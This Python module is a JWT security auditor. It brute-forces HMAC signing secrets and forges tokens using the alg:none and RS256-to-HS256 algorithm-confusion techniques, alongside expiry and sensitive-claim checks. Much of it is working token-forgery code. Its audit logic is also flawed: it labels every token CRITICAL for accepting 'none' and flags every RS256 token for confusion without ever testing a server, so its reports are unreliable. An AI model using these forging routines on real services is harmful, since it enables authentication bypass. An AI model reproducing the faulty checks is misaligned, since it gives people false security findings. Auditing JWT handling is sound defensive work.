#!/usr/bin/env python3
"""
JWT Security Auditor Module
Tests for JWT vulnerabilities including:
- Weak secrets
- Algorithm confusion (RS256 -> HS256)
- None algorithm
- Key injection
- Expiration bypass
"""

import asyncio
import base64
import hashlib
import hmac
import json
import jwt
from typing import Dict, List, Optional, Any
from pathlib import Path
import httpx


class JWTAuditor:
    """JWT Security Testing Module"""
    
    def __init__(self):
        self.vulnerabilities: List[Dict[str, Any]] = []
        self.findings: Dict[str, Any] = {}
        self.common_secrets = [
            "secret", "secret123", "password", "123456",
            "admin", "admin123", "test", "test123",
            "jwt", "jwt123", "key", "key123",
            "your-256-bit-secret", "your-secret-key",
            "HS256", "HS512", "RS256",
        ]
    
    def decode_jwt(self, token: str) -> Optional[Dict]:
        """Decode JWT without verification"""
        try:
            # Split token
            parts = token.split('.')
            if len(parts) != 3:
                return None
            
            # Decode header
            header_padding = 4 - len(parts[0]) % 4
            if header_padding != 4:
                parts[0] += '=' * header_padding
            header = json.loads(base64.urlsafe_b64decode(parts[0]))
            
            # Decode payload
            payload_padding = 4 - len(parts[1]) % 4
            if payload_padding != 4:
                parts[1] += '=' * payload_padding
            payload = json.loads(base64.urlsafe_b64decode(parts[1]))
            
            return {
                "header": header,
                "payload": payload,
                "raw_header": parts[0],
                "raw_payload": parts[1],
                "signature": parts[2]
            }
        except Exception as e:
            return {"error": str(e)}
    
    def check_weak_secret(self, token: str, secret: str, algorithm: str) -> bool:
        """Check if token was signed with given secret"""
        try:
            jwt.decode(token, secret, algorithms=[algorithm])
            return True
        except:
            return False
    
    async def brute_force_secret(self, token: str, wordlist: Optional[str] = None) -> Optional[str]:
        """Brute force JWT secret"""
        decoded = self.decode_jwt(token)
        if not decoded or "header" not in decoded:
            return None
        
        algorithm = decoded["header"].get("alg", "HS256")
        if algorithm not in ["HS256", "HS384", "HS512"]:
            return None
        
        # Load wordlist
        secrets = self.common_secrets.copy()
        if wordlist and Path(wordlist).exists():
            with open(wordlist, 'r') as f:
                secrets.extend(line.strip() for line in f if line.strip())
        
        # Test each secret
        for secret in secrets:
            if self.check_weak_secret(token, secret, algorithm):
                return secret
            await asyncio.sleep(0)  # Prevent blocking
        
        return None
    
    def test_alg_none(self, token: str) -> Optional[Dict]:
        """Test algorithm none vulnerability"""
        try:
            decoded = self.decode_jwt(token)
            if not decoded:
                return None
            
            # Create new token with alg:none
            header = decoded["header"].copy()
            header["alg"] = "none"
            
            new_header = base64.urlsafe_b64encode(
                json.dumps(header).encode()
            ).decode().rstrip('=')
            
            new_token = f"{new_header}.{decoded['raw_payload']}."
            
            return {
                "original": token,
                "modified": new_token,
                "header": header
            }
        except Exception as e:
            return None
    
    def test_algorithm_confusion(self, token: str, public_key: Optional[str] = None) -> Optional[Dict]:
        """Test algorithm confusion (RS256 -> HS256)"""
        try:
            decoded = self.decode_jwt(token)
            if not decoded:
                return None
            
            current_alg = decoded["header"].get("alg", "")
            if current_alg != "RS256":
                return None
            
            # If we have a public key, try to use it as HMAC secret
            if public_key:
                header = decoded["header"].copy()
                header["alg"] = "HS256"
                
                new_header = base64.urlsafe_b64encode(
                    json.dumps(header).encode()
                ).decode().rstrip('=')
                
                # Create signature using public key as secret
                message = f"{new_header}.{decoded['raw_payload']}".encode()
                signature = hmac.new(
                    public_key.encode(),
                    message,
                    hashlib.sha256
                ).digest()
                new_sig = base64.urlsafe_b64encode(signature).decode().rstrip('=')
                
                new_token = f"{new_header}.{decoded['raw_payload']}.{new_sig}"
                
                return {
                    "attack": "algorithm_confusion",
                    "original_alg": "RS256",
                    "new_alg": "HS256",
                    "modified_token": new_token
                }
            
            return {"potential": True, "note": "Public key needed for full test"}
        except Exception as e:
            return None
    
    def check_expiration(self, payload: Dict) -> Dict[str, Any]:
        """Check token expiration settings"""
        import time
        issues = []
        
        current_time = int(time.time())
        
        if 'exp' in payload:
            exp_time = payload['exp']
            if exp_time < current_time:
                issues.append("Token has expired")
            elif exp_time > current_time + 86400 * 365:  # More than 1 year
                issues.append("Token expires in more than 1 year (long-lived)")
        else:
            issues.append("No expiration (exp) claim set")
        
        if 'iat' not in payload:
            issues.append("No issued at (iat) claim")
        
        return {
            "has_expiration": 'exp' in payload,
            "has_issued_at": 'iat' in payload,
            "issues": issues
        }
    
    async def audit(self, token: str, wordlist: Optional[str] = None, 
                   exploit: bool = False) -> Dict[str, Any]:
        """Run full JWT security audit"""
        self.vulnerabilities = []
        self.findings = {}
        
        # Decode and analyze
        decoded = self.decode_jwt(token)
        if not decoded or "error" in decoded:
            return {
                "error": "Invalid JWT token",
                "vulnerabilities": [],
                "findings": {}
            }
        
        header = decoded.get("header", {})
        payload = decoded.get("payload", {})
        
        self.findings = {
            "algorithm": header.get("alg", "Unknown"),
            "token_type": header.get("typ", "Unknown"),
            "issuer": payload.get("iss", "Not set"),
            "subject": payload.get("sub", "Not set"),
            "audience": payload.get("aud", "Not set"),
            "claims": list(payload.keys()),
            "decoded_header": header,
            "decoded_payload": payload
        }
        
        # Check for weak secrets
        if header.get("alg") in ["HS256", "HS384", "HS512"]:
            weak_secret = await self.brute_force_secret(token, wordlist)
            if weak_secret:
                self.vulnerabilities.append({
                    "severity": "CRITICAL",
                    "type": "weak_secret",
                    "description": f"JWT signed with weak secret: '{weak_secret}'",
                    "recommendation": "Use a cryptographically strong random secret (256+ bits)"
                })
        
        # Test algorithm none
        alg_none_result = self.test_alg_none(token)
        if alg_none_result:
            self.vulnerabilities.append({
                "severity": "CRITICAL",
                "type": "algorithm_none",
                "description": "Server accepts 'none' algorithm - signature bypass possible",
                "recommendation": "Reject tokens with 'none' algorithm",
                "test_token": alg_none_result["modified"] if exploit else None
            })
        
        # Test algorithm confusion
        if header.get("alg") == "RS256":
            confusion = self.test_algorithm_confusion(token)
            if confusion:
                self.vulnerabilities.append({
                    "severity": "HIGH",
                    "type": "algorithm_confusion",
                    "description": "Potential algorithm confusion (RS256 -> HS256)",
                    "recommendation": "Explicitly verify algorithm type before processing"
                })
        
        # Check expiration
        exp_check = self.check_expiration(payload)
        for issue in exp_check["issues"]:
            severity = "MEDIUM" if "expired" in issue else "LOW"
            self.vulnerabilities.append({
                "severity": severity,
                "type": "token_lifetime",
                "description": issue,
                "recommendation": "Set appropriate expiration times"
            })
        
        # Check for sensitive data
        sensitive_claims = ['password', 'pwd', 'secret', 'key', 'token', 'credit_card']
        for claim in payload:
            if any(s in claim.lower() for s in sensitive_claims):
                self.vulnerabilities.append({
                    "severity": "MEDIUM",
                    "type": "sensitive_data",
                    "description": f"Potentially sensitive claim found: '{claim}'",
                    "recommendation": "Don't store sensitive data in JWT payload"
                })
        
        return {
            "token": token[:50] + "..." if len(token) > 50 else token,
            "vulnerabilities": self.vulnerabilities,
            "findings": self.findings,
            "info": {
                "total_vulnerabilities": len(self.vulnerabilities),
                "critical": len([v for v in self.vulnerabilities if v["severity"] == "CRITICAL"]),
                "high": len([v for v in self.vulnerabilities if v["severity"] == "HIGH"]),
                "medium": len([v for v in self.vulnerabilities if v["severity"] == "MEDIUM"]),
                "low": len([v for v in self.vulnerabilities if v["severity"] == "LOW"])
            }
        }